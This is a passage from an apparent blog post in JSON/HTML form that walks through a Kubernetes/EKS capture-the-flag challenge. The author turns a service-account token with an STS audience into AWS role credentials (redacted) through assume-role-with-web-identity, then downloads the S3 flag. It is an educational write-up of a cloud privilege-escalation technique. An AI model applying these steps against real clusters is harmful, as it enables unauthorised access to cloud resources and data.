[get]\n                                                [/api/*]                              []                 [get]\n                                                [/api]                                []                 [get]\n                                                [/apis/*]                             []                 [get]\n                                                [/apis]                               []                 [get]\n                                                [/healthz]                            []                 [get]\n                                                [/healthz]                            []                 [get]\n                                                [/livez]                              []                 [get]\n                                                [/livez]                              []                 [get]\n                                                [/openapi/*]                          []                 [get]\n                                                [/openapi]                            []                 [get]\n                                                [/openid/v1/jwks]                     []                 [get]\n                                                [/readyz]                             []                 [get]\n                                                [/readyz]                             []                 [get]\n                                                [/version/]                           []                 [get]\n                                                [/version/]                           []                 [get]\n                                                [/version]                            []                 [get]\n                                                [/version]                            []                 [get]\npodsecuritypolicies.policy                      []                                    [eks.privileged]   [use]\n</code></pre>\n<p>Looks like we have less access than before.  So not too helpful, lets take a\nlook at that service account we want to become:</p>\n<pre><code class=\"hljs language-bash\">❯ kubectl get sa s3access-sa -o json\n{\n    <span class=\"hljs-string\">\"apiVersion\"</span>: <span class=\"hljs-string\">\"v1\"</span>,\n    <span class=\"hljs-string\">\"kind\"</span>: <span class=\"hljs-string\">\"ServiceAccount\"</span>,\n    <span class=\"hljs-string\">\"metadata\"</span>: {\n        <span class=\"hljs-string\">\"annotations\"</span>: {\n            <span class=\"hljs-string\">\"eks.amazonaws.com/role-arn\"</span>: <span class=\"hljs-string\">\"arn:aws:iam::688655246681:role/challengeEksS3Role\"</span>\n        },\n        <span class=\"hljs-string\">\"creationTimestamp\"</span>: <span class=\"hljs-string\">\"2023-10-31T20:07:34Z\"</span>,\n        <span class=\"hljs-string\">\"name\"</span>: <span class=\"hljs-string\">\"s3access-sa\"</span>,\n        <span class=\"hljs-string\">\"namespace\"</span>: <span class=\"hljs-string\">\"challenge5\"</span>,\n        <span class=\"hljs-string\">\"resourceVersion\"</span>: <span class=\"hljs-string\">\"671916\"</span>,\n        <span class=\"hljs-string\">\"uid\"</span>: <span class=\"hljs-string\">\"86e44c49-b05a-4ebe-800b-45183a6ebbda\"</span>\n    }\n}\n</code></pre>\n<p>I think we are going to need to use our AWS access to assume that role, I don't\nbelieve our kubernetes access is going to get us anywhere:</p>\n<pre><code class=\"hljs language-bash\">❯ aws sts assume-role --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name <span class=\"hljs-built_in\">test</span>\n\nAn error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role\n</code></pre>\n<p>Ok, so <em>maybe</em> our kubernetes access is important since we can't assume the role\ndirectly.   Lets try to use that $TOKEN from <code>debug-sa</code> to assume the role:</p>\n<pre><code class=\"hljs language-bash\">❯ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name <span class=\"hljs-built_in\">test</span> --web-identity-token <span class=\"hljs-variable\">$TOKEN</span>\n\nAn error occurred (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience\n</code></pre>\n<p>Getting closer!   The default audience for a token created with <code>kubectl</code> is\n<code>https://kubernetes.default.svc</code> which amazon doesn't seem to like.  Lets try\ncreating it again with <code>sts.amazonaws.com</code>:</p>\n<pre><code class=\"hljs language-bash\">❯ <span class=\"hljs-built_in\">export</span> TOKEN=$(kubectl create token debug-sa --audience sts.amazonaws.com)\n❯ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name <span class=\"hljs-built_in\">test</span> --web-identity-token <span class=\"hljs-variable\">$TOKEN</span>\n{\n    <span class=\"hljs-string\">\"Credentials\"</span>: {\n        <span class=\"hljs-string\">\"AccessKeyId\"</span>: <span class=\"hljs-string\">\"ASIA2AVYNEV&#x3C;*REDACTED*>\"</span>,\n        <span class=\"hljs-string\">\"SecretAccessKey\"</span>: <span class=\"hljs-string\">\"VTZ4TuDrtHGca&#x3C;*REDACTED*>\"</span>,\n        <span class=\"hljs-string\">\"SessionToken\"</span>: <span class=\"hljs-string\">\"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>\"</span>,\n        <span class=\"hljs-string\">\"Expiration\"</span>: <span class=\"hljs-string\">\"2023-11-03T05:09:07+00:00\"</span>\n    },\n    <span class=\"hljs-string\">\"SubjectFromWebIdentityToken\"</span>: <span class=\"hljs-string\">\"system:serviceaccount:challenge5:debug-sa\"</span>,\n    <span class=\"hljs-string\">\"AssumedRoleUser\"</span>: {\n        <span class=\"hljs-string\">\"AssumedRoleId\"</span>: <span class=\"hljs-string\">\"AROA2AVYNEVMZEZ2AFVYI:test\"</span>,\n        <span class=\"hljs-string\">\"Arn\"</span>: <span class=\"hljs-string\">\"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test\"</span>\n    },\n    <span class=\"hljs-string\">\"Provider\"</span>: <span class=\"hljs-string\">\"arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589\"</span>,\n    <span class=\"hljs-string\">\"Audience\"</span>: <span class=\"hljs-string\">\"sts.amazonaws.com\"</span>\n}\n</code></pre>\n<p>Success!  We have some new AWS credentials.  Lets setup our new AWS Session:</p>\n<pre><code class=\"hljs language-bash\">❯ <span class=\"hljs-built_in\">export</span> AWS_ACCESS_KEY_ID=<span class=\"hljs-string\">\"ASIA2AVYNEV&#x3C;*REDACTED*>\"</span>\n❯ <span class=\"hljs-built_in\">export</span> AWS_SECRET_ACCESS_KEY=<span class=\"hljs-string\">\"VTZ4TuDrtHGca&#x3C;*REDACTED*>\"</span>\n❯ <span class=\"hljs-built_in\">export</span> AWS_SESSION_TOKEN=<span class=\"hljs-string\">\"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>\"</span>\n\n❯ aws sts get-caller-identity\n{\n    <span class=\"hljs-string\">\"UserId\"</span>: <span class=\"hljs-string\">\"AROA2AVYNEVMZEZ2AFVYI:test\"</span>,\n    <span class=\"hljs-string\">\"Account\"</span>: <span class=\"hljs-string\">\"688655246681\"</span>,\n    <span class=\"hljs-string\">\"Arn\"</span>: <span class=\"hljs-string\">\"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test\"</span>\n}\n</code></pre>\n<p>We are now the new role!   We hopefully have access to S3 now.  At the start\nof the challenge it provided us a clue to what bucket we want to view by\nproviding us the IAM policy:</p>\n<pre><code class=\"hljs language-json\"><span class=\"hljs-punctuation\">{</span>\n    <span class=\"hljs-attr\">\"Policy\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">{</span>\n        <span class=\"hljs-attr\">\"Statement\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">[</span>\n            <span class=\"hljs-punctuation\">{</span>\n                <span class=\"hljs-attr\">\"Action\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">[</span>\n                    <span class=\"hljs-string\">\"s3:GetObject\"</span><span class=\"hljs-punctuation\">,</span>\n                    <span class=\"hljs-string\">\"s3:ListBucket\"</span>\n                <span class=\"hljs-punctuation\">]</span><span class=\"hljs-punctuation\">,</span>\n                <span class=\"hljs-attr\">\"Effect\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"Allow\"</span><span class=\"hljs-punctuation\">,</span>\n                <span class=\"hljs-attr\">\"Resource\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">[</span>\n                    <span class=\"hljs-string\">\"arn:aws:s3:::challenge-flag-bucket-3ff1ae2\"</span><span class=\"hljs-punctuation\">,</span>\n                    <span class=\"hljs-string\">\"arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag\"</span>\n                <span class=\"hljs-punctuation\">]</span>\n            <span class=\"hljs-punctuation\">}</span>\n        <span class=\"hljs-punctuation\">]</span><span class=\"hljs-punctuation\">,</span>\n        <span class=\"hljs-attr\">\"Version\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"2012-10-17\"</span>\n    <span class=\"hljs-punctuation\">}</span>\n<span class=\"hljs-punctuation\">}</span>\n</code></pre>\n<p>So we want to fetch <code>arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag</code>:</p>\n<pre><code class=\"hljs language-bash\">❯ aws s3 <span class=\"hljs-built_in\">cp</span> s3://challenge-flag-bucket-3ff1ae2/flag .\ndownload: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag       \n❯ <span class=\"hljs-built_in\">cat</span> flag\nwiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws&#x3C;*REDACTED*>}\n</code></pre>\n<p>and thats the final flag! In my next post I'll discuss the remediation steps\nto prevent this configuration mistakes on your cluster!</p>","category":"Kubernetes","date":"2023-11-01T20:00:00-04:00","tags":["Kubernetes","SRE","Security"],"title":"eksclustergames.com walk through!"}},"__N_SSG":true}